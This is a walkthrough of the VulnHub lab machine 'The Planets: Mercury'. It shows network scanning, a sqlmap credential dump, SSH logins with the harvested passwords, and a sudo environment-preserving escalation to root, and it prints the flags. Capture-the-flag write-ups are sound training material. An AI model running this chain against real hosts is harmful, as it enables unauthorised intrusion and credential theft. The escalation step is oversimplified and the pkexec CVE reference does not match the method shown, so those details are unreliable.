# 🛰️ The Planets: Mercury – VulnHub Walkthrough

**Difficulty:** Easy  
**Author:** SirFlash  
**Platform:** VulnHub  
**Objective:** Gain root access and retrieve both user and root flags.

---

## 🚀 Overview

Mercury is a beginner-friendly boot2root virtual machine hosted on VulnHub. The goal is to leverage enumeration, SQL injection, SSH login, and privilege escalation techniques to retrieve two flags.

---

## 🧰 Tools Used

- Kali Linux  
- netdiscover  
- nmap  
- sqlmap  
- wfuzz  
- SSH client  
- Text editors (nano, vim)  
- `sudo --preserve-env`

---

## 🧭 Steps to Exploit

### 1. 🔍 Network Discovery

Use `netdiscover` to find the target's IP address:

```bash
netdiscover -r 192.168.56.0/24
```

> **Discovered IP:** `192.168.56.105`

---

### 2. 🚪 Port Scanning

Run an Nmap scan to detect services and versions:

```bash
nmap -sC -sV 192.168.56.105
```

> **Open Ports:**
> - 22 (SSH)
> - 8080 (HTTP)

---

### 3. 🌐 Web Enumeration

Visit `http://192.168.56.105:8080/` and explore.  
Accessing `/mercuryfacts/` reveals dynamic content, possibly from a database.

---

### 4. 🛠️ SQL Injection

Use `sqlmap` to test and exploit SQL injection on the `/mercuryfacts/1` endpoint:

```bash
sqlmap -u http://192.168.56.105:8080/mercuryfacts/1 --dump
```

> This reveals login credentials stored in the database.

---

### 5. 🔐 SSH Access

Login using the credentials obtained from SQLMap:

```bash
ssh webmaster@192.168.56.105
```

Find the first flag:

```bash
cat user_flag.txt
```

> **User Flag:** `user_flag_8339915c9a454657bd60ee58776f4ccd`

---

### 6. 🧾 Discover Notes for Next User

Check for hints left behind:

```bash
cat Notes.txt
```

> Reveals credentials for `linuxmaster`

Log in as the new user:

```bash
ssh linuxmaster@localhost
```

---

### 7. 📈 Privilege Escalation

Escalate to root using `sudo` while preserving environment variables:

```bash
sudo --preserve-env=PATH /bin/bash
```

---

### 8. 🏁 Retrieve Root Flag

Once root access is gained:

```bash
cat /root/root_flag.txt
```

> **Root Flag:** `root_flag_69426d9fda579afbffd9c2d47ca31d90`

---

## ✅ Summary

- Enumerated the web service and found a SQL injection.
- Dumped credentials and gained shell access via SSH.
- Switched to a higher-privileged user.
- Used `sudo --preserve-env` to become root.
- Captured both flags!

---

## 📚 References

- [Mercury VM on VulnHub](https://www.vulnhub.com/entry/the-planets-mercury,678/)
- [CVE-2021-4034 (GTFOBins)](https://gtfobins.github.io/gtfobins/pkexec/)

---
